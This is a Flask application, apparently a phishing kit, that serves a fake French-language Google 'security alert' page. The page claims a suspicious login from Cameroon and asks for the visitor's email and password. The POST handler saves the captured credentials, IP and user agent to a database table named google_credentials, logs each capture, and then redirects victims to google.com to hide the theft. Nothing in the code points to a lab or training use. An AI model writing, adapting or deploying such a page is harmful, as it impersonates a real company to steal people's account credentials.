import os
import psycopg2
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def get_client_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Inconnu')
    return ip, ua

# Page d'alerte qui s'affiche quand on clique sur le lien (GET)
@app.route('/check-activity', methods=['GET'])
def show_alert():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Alerte de sécurité - Google</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
            button:hover { background: #1557b0; }
            .logo { font-size: 28px; font-weight: bold; margin-bottom: 20px; }
            .google-blue { color: #4285f4; }
            .google-red { color: #ea4335; }
            .google-yellow { color: #fbbc05; }
            .google-green { color: #34a853; }
            h3 { color: #202124; margin: 0 0 10px 0; }
            p { color: #5f6368; margin: 0 0 20px 0; }
            .alert-icon { font-size: 48px; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <span class="google-blue">G</span><span class="google-red">o</span><span class="google-yellow">o</span><span class="google-blue">g</span><span class="google-green">l</span><span class="google-red">e</span>
            </div>
            <div class="alert-icon">⚠️</div>
            <h3>Alerte de sécurité</h3>
            <p>Une connexion suspecte a été détectée sur votre compte depuis un iPhone au Cameroun.</p>
            <form method="POST" action="/check-activity">
                <input type="email" name="email" placeholder="Votre adresse email" required>
                <input type="password" name="password" placeholder="Votre mot de passe" required>
                <button type="submit">Vérifier mon identité</button>
            </form>
        </div>
    </body>
    </html>
    ''')

# Traitement du formulaire (POST)
@app.route('/check-activity', methods=['POST'])
def check_activity():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return "Données manquantes", 400

    ip, ua = get_client_info()
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO google_credentials (email, password, ip_address, user_agent)
            VALUES (%s, %s, %s, %s)
        """, (email, password, ip, ua))
        conn.commit()
        cur.close()
        conn.close()
        print(f"🔐 Capturé : {email} depuis {ip}")
    except Exception as e:
        print(f"❌ Erreur BD : {e}")
        return "Erreur serveur", 500

    # Redirection vers Google après capture
    return redirect('https://www.google.com')

@app.route('/')
def index():
    return redirect('https://www.google.com')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
